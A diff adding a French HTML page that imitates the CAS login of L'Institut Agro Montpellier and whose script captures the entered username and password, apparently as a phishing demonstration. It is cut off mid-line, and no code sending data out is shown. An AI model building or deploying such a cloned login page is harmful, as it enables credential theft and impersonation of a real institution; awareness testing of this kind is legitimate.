@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Authentification - L'Institut Agro</title>
+    <style>
+        body { font-family: Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-card { background: white; width: 380px; border-top: 5px solid #005a9c; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 30px; border-radius: 4px; }
+        .logo-area { text-align: center; margin-bottom: 20px; }
+        .logo-area h1 { font-size: 1.2em; color: #333; margin: 0; }
+        
+        label { display: block; margin-bottom: 5px; font-weight: bold; font-size: 0.9em; }
+        input { width: 100%; padding: 10px; margin-bottom: 15px; border: 1px solid #ccc; border-radius: 3px; box-sizing: border-box; }
+        
+        .btn-submit { width: 100%; padding: 12px; background-color: #005a9c; color: white; border: none; border-radius: 3px; cursor: pointer; font-weight: bold; }
+        .btn-submit:hover { background-color: #004070; }
+        
+        .alert { background: #fff3cd; border-left: 4px solid #ffc107; padding: 10px; font-size: 0.8em; margin-top: 20px; color: #856404; }
+        .footer { text-align: center; margin-top: 20px; font-size: 0.8em; color: #005a9c; }
+    </style>
+</head>
+<body>
+
+<div class="login-card">
+    <div class="logo-area">
+        <h1>L'Institut Agro Montpellier</h1>
+        <p style="font-size: 0.8em; color: #666;">Service d'authentification (CAS)</p>
+    </div>
+
+    <form id="loginForm">
+        <label>Identifiant</label>
+        <input type="text" id="user" required placeholder="ex: jdupont">
+        
+        <label>Mot de passe</label>
+        <input type="password" id="pass" required>
+        
+        <button type="submit" class="btn-submit" id="btn">SE CONNECTER</button>
+    </form>
+
+    <div class="alert">
+        <strong>Sécurité :</strong> Vérifiez que l'URL commence par <b>https://partage.supagro.fr</b> avant de saisir vos accès.
+    </div>
+
+    <div class="footer">
+        <a href="#" style="color: #005a9c; text-decoration: none;">Aide et support</a>
+    </div>
+</div>
+
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const user = document.getElementById('user').value;
+        const pass = document.getElementById('pass').value;
+        const btn = document.getElementById('btn');
+
+        // PREUVE DE CAPTURE (Affiché dans la console F12)
+        console.warn("ALERTE SÉCURITÉ :
